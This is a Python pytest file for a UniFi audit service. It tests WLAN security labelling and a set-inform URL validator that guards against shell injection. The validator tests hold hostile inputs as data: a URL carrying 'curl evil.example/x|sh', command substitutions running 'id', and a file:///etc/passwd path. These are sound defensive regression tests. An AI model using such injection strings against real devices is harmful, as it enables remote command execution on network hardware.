"""Tests for UniFi service-layer helpers."""

from __future__ import annotations

import pytest

from app.services.unifi_api import is_open_wlan_security, wlan_security_label


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("open", "Open"),
        ("wpapsk", "WPA2"),
        ("wpa2", "WPA2"),
        ("wpa3", "WPA3"),
        ("sae", "WPA3"),          # SAE is WPA3-Personal's handshake
        ("wpaeap", "WPA2-Enterprise"),
        ("wpa2eap", "WPA2-Enterprise"),
        ("wpa3eap", "WPA3-Enterprise"),
        ("wep", "WEP (insecure)"),
        ("WPA3", "WPA3"),         # case-insensitive
    ],
)
def test_known_security_values_are_labelled(value, expected):
    assert wlan_security_label(value) == expected


@pytest.mark.parametrize("value", ["", "   ", None, 123, [], {}])
def test_missing_or_non_string_security_is_unknown_not_open(value):
    """Regression: absent or malformed values fell through to "Open".

    The mapping was a chain of substring checks over a default of "Open", so a
    value it did not recognise — including None, which would also raise on
    .lower() — was reported as an unencrypted network.
    """
    assert wlan_security_label(value) == "Unknown"


def test_unrecognised_cipher_is_reported_as_unknown_with_its_value():
    """An unfamiliar cipher must not be reported as an open network.

    Either direction is a false finding: it sends a technician to secure a
    network that is already encrypted, and it would hide a genuinely open SSID
    behind the same label. Surfacing the raw value keeps it actionable.
    """
    label = wlan_security_label("some-future-cipher")
    assert label == "Unknown (some-future-cipher)"
    assert label != "Open"


def test_wep_is_named_rather_than_flattered_or_mislabelled():
    """WEP under the old mapping came out as "Open"."""
    assert wlan_security_label("wep") == "WEP (insecure)"


# ── is_open_wlan_security: the predicate the risk scorer acts on ──────────────


def test_only_a_positive_open_reading_is_an_open_network():
    assert is_open_wlan_security("open") is True
    assert is_open_wlan_security("OPEN") is True


@pytest.mark.parametrize(
    "value",
    [None, "", "   ", 123, [], {}, "some-future-cipher", "wpapsk", "wpa3", "wep"],
)
def test_absent_or_unclassifiable_security_is_not_an_open_network(value):
    """An open-WiFi finding is critical-priority and names the SSID.

    Everything here is either encrypted or unreadable; neither may raise it.
    """
    assert is_open_wlan_security(value) is False


# ── set-inform: shell injection into customer network hardware ───────────────


class TestSetInformUrlValidation:
    """The inform URL is interpolated into a root shell command on the device.

    The old guard was startswith("http") and endswith("/inform"), which a
    payload can satisfy while still carrying shell metacharacters. Two layers
    now stop it: the route rebuilds the URL from parsed components, and
    set_inform shell-quotes whatever it is given.
    """

    def test_a_shell_payload_is_refused(self):
        from app.core.exceptions import ValidationError
        from app.web.routes.unifi import _validated_inform_url

        # Satisfies both of the original checks.
        payload = "http://10.0.0.1/;curl evil.example/x|sh #/inform"
        assert payload.startswith("http") and payload.endswith("/inform")
        with pytest.raises(ValidationError):
            _validated_inform_url(payload)

    @pytest.mark.parametrize(
        "bad",
        [
            "http://10.0.0.1/$(id)/inform",
            "http://10.0.0.1/`id`/inform",
            "http://10.0.0.1/inform?x=1",
            "file:///etc/passwd/inform",
            "http:// /inform",
            # urlparse defers the port parse to attribute access and then
            # raises a plain ValueError. Both of these used to reach the global
            # handler as a 500 "internal error" rather than a 400 telling the
            # technician what was wrong with their input.
            "http://10.0.0.1:99999/inform",
            "http://10.0.0.1:abc/inform",
        ],
    )
    def test_metacharacters_and_odd_schemes_are_refused(self, bad):
        from app.core.exceptions import ValidationError
        from app.web.routes.unifi import _validated_inform_url

        with pytest.raises(ValidationError):
            _validated_inform_url(bad)

    @pytest.mark.parametrize(
        "raw,expected",
        [
            ("http://10.0.0.1:8080/inform", "http://10.0.0.1:8080/inform"),
            ("10.0.0.1:8080", "http://10.0.0.1:8080/inform"),
            # UniFi's own proxy form must survive — an equality check on the
            # path would have rejected it.
            ("https://unifi.example.no/proxy/network/inform",
             "https://unifi.example.no/proxy/network/inform"),
            # urlparse strips the brackets off an IPv6 literal, so rebuilding
            # from .hostname alone emitted http://::1:8080/inform — an address
            # the device cannot resolve.
            ("http://[fd00::1]:8080/inform", "http://[fd00::1]:8080/inform"),
        ],
    )
    def test_legitimate_urls_still_work(self, raw, expected):
        from app.web.routes.unifi import _validated_inform_url

        assert _validated_inform_url(raw) == expected

    async def test_the_command_is_quoted_even_if_validation_is_bypassed(self):
        """Defence in depth: the command boundary does not trust its caller."""
        from app.modules.unifi_audit.client import UniFiDirectDevice

        sent = {}

        dev = UniFiDirectDevice("10.0.0.1", "ubnt", "ubnt")

        async def _fake_exec(cmd, timeout=15):
            sent["cmd"] = cmd
            return ("", "", 0)

        dev._ssh_exec = _fake_exec
        await dev.set_inform("http://10.0.0.1/;id #/inform")

        # The metacharacters must be inside a quoted argument, not live shell.
        assert ";id" not in sent["cmd"].split("'")[0]
        assert sent["cmd"].startswith("mca-cli-op set-inform ")
